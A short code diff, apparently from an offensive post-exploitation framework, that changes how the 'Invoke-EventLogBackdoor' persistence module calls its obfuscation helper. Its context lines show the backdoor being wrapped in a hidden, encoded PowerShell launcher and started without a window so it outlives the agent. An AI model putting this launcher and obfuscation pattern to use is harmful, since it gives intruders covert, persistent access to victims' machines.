@@ -160,7 +160,7 @@ Invoke-EventLogBackdoor"""
             return ""
 
         if obfuscate:
-            script = helpers.obfuscate(psScript=script, obfuscationCommand=obfuscationCommand)
+            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
         # transform the backdoor into something launched by powershell.exe
         # so it survives the agent exiting  
         modifiable_launcher = "powershell.exe -noP -sta -w 1 -enc "
@@ -171,7 +171,7 @@ Invoke-EventLogBackdoor"""
         # set up the start-process command so no new windows appears
         scriptLauncher = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-EventLogBackdoor started'" % (parts[0], " ".join(parts[1:]))
         if obfuscate:
-            scriptLauncher = helpers.obfuscate(psScript=scriptLauncher, obfuscationCommand=obfuscationCommand)
+            scriptLauncher = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptLauncher, obfuscationCommand=obfuscationCommand)
 
         print scriptLauncher
         
